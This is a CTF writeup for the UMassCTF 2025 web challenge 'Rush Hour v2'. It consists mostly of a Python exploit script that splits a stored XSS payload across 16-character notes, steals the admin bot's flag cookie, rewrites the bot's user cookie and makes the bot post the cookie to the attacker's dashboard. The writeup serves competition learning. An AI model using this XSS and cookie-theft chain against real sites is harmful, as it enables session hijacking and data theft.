---
title: "Rush Hour v2 - UMassCTF 2025"
category: "web"
subcategory: "xss"
type: "writeup"
tags: ["web", "xss", "rush", "hour", "umassctf", "umassctf-2025", "2025", "ctf-writeup"]
summary: "This challenge is the same to version 1, but basically with the method I attempted to solve #1 in (and for that reason, v2 was actually easier for me)."
source:
  name: "CTFtime writeup #40169"
  url: "https://ctftime.org/writeup/40169"
ctf:
  name: "UMassCTF 2025"
  year: 2025
  challenge: "Rush Hour v2"
---

## Metadata

- **CTF:** UMassCTF 2025
- **Task:** Rush Hour v2
- **Author team:** twosheep
- **CTFtime tags:** xss
- **CTFtime:** <https://ctftime.org/writeup/40169>

---
This challenge is the same to version 1, but basically with the method I attempted to solve #1 in (and for that reason, v2 was actually easier for me).

Essentially, the admin bot is now not allowed to query any URL outside of localhost (the website). But, the restriction on the admin bot posting notes onto other user dashboards is now removed. This means that, essentially, the goal here is:  
1\. Get the flag cookie by doing the standard method seen in v1 (GET the /create endpoint with a redirection XSS via `img.src`, set the `window.location` to the root directory which redirects to the admin dashboard, redirection XSS takes us back but now with the flag cookie set)  
2\. Modify the cookie of the admin bot to be that of the user we currently are (so it posts to our dashboard instead of his)  
3\. Make the admin post to the `/create` endpoint (again) a note containing their `document.cookie`. However, this time it'll be to our dashboard, since we set the `document.cookie` user to us instead of admin.  
4\. We'll now see an extra note containing the flag (though, making sure to substring the other cookies out due to the 16-character limitation).

If you read this first and not Rush Hour v1, please do that first to understand the rest of the code.

```python  
from requests import session  
from urllib.parse import quote  
from time import sleep

url = "<http://rush-hour-v2.ctf.umasscybersec.org>"  
final_site = "http://127.0.0.1:3000/create?note="

#get our user identity  
s = session()  
user = s.get(url).url[len(url+"/user/"):]  
print(user)

#generate our payload  
def send_note(msg):  
assert(len(msg) <= 16)  
[s.post](http://s.post)(f"{url}/create", data={"note": msg}).text

#the image  
send_note("")

#generate the XSS  
send_note("<script>\"")  
send_note("\";q=location;\"")  
send_note("\";d=console;\"")

#image finished loading; refresh page  
send_note("\";function t(){\"")  
send_note("\";location='/'}\"")

#get the cookie  
send_note("\";x=document;\"")  
send_note("\";y=x.cookie;\"")

#get the hash and the url to send cookies too  
send_note("\";b=q.hash;\"")  
send_note("\";w=q.search;\"")  
send_note("\";j=b.length;\"")  
send_note("\";d.log(j);\"")

#http prefix  
send_note("\";z='https://';\"")  
send_note("\";k='http://';\"")

#handle going to the final site  
send_note("\";if(j==0){\"")

#add the site to query  
send_note(f"\";n='{final_site[0]}';\"")  
for c in final_site[1:]:  
send_note(f"\";n+='{c}';\"")

#modify our user cookie to be this user  
#so that way we can call create() and make a note with the flag  
target_cookie = f"user={user}; path=/"  
send_note(f"\";s='{target_cookie[0]}';\"")  
for c in target_cookie[1:]:  
send_note(f"\";s+='{c}';\"")  
send_note("\";x.cookie=s;\"")

#navigate to the site to deposit our cookie  
send_note("\";y=y.substr(\"")  
send_note("\".length*5+6);\"")  
send_note("\";w=n+y;\"")  
send_note("\";location=w;\"")  
send_note("\";alert(1)}\"")

#get the image  
send_note("\";v='getEleme';\"")  
send_note("\";v+='ntById';\"")  
send_note("\";p=x[v]('hi');\"")

#go to the location specified in the hash  
send_note("\";n=b.substr(\"")  
send_note("\".length);\"")  
send_note("\";r=n;\"")  
send_note("\";q.hash='';\"")  
send_note("\";w='127.0';\"")  
send_note("\";w+='.0.1';\"")  
send_note("\";w+=':3000';\"")  
send_note("\";w+='/';\"")  
send_note("\";r+='</scr';\"")  
send_note("\";r+='ipt>';\"")  
send_note("\";j=k+w+r;\"")

#finalize image  
send_note("\";p.src=j;\"")  
send_note("\";m=setTimeout;\"")  
send_note("\";m(t,500);\"")

send_note("\"</script>")

#now, if we want to send in code for admin to execute  
def send_code(code):  
print(s.get(f"{url}/report/{user}%23{'a'*8}{quote(code)}").text)

#update their notes  
send_code("create?note=<script>history.back()")

#wait a bit  
sleep(3)

#get the flag  
res = s.get(f"{url}/").text  
res = res[res.index("UMASS"):]  
print(res[:res.index("}")]+"}")  
```
